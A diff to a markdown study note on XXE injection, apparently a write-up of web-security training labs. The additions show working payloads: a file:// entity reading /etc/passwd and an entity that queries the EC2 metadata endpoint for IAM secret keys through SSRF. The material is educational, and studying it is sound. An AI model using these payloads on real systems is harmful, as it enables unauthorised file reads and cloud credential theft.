@@ -95,7 +95,7 @@ So now let's understand how that DTD validates the XML. Here's what all those te
 * **Exploiting blind XXE exfiltrate data out-of-band**, where sensitive data is transmitted from the application server to a system that the attacker controls.
 * **Exploiting blind XXE to retrieve data via error messages**, where the attacker can trigger a parsing error message containing sensitive data.
 
-## Exploiting XXE to retrieve files
+### Exploiting XXE to retrieve files
 
 To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:
 
@@ -126,9 +126,17 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ...
 ```
 
-## Exploiting XXE to perofrm SSRF attacks
+### Exploiting XXE to perform SSRF attacks
 
-d
+To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform blind SSRF attacks (which can still have critical consequences).
+
+In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]> 
+```
+
+### Exploiting Blind XXE
 
 
 
@@ -179,14 +187,39 @@ Here again, we are defining an ENTITY with the name `read` but the difference is
 
 #### Exploiting XXE using external entities to retrieve files
 
+> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
+>
+> Inject an XML external entity to retrieve the contents of the /etc/passwd file.
+
 After selecting the 'Check Stock' button we see the below request body in Developer Tools
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>20</productId><storeId>1</storeId></stockCheck>
 ```
 
-Payload Used when editing and resending the request
+Payload used when editing and re-sending the request
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]><stockCheck><productId>&read;</productId><storeId>1</storeId></stockCheck>
 ```
+
+#### Exploiting XXE to perform SSRF attacks
+
+> The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
+>
+> Exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.
+
+After selecting the 'Check Stock' button we see the below request body in Developer Tools
+
+```
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+Payload used when editing and re-sending the request after iteratively appending to `/latest/meta-data/` in the URL request
+
+```
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+
+
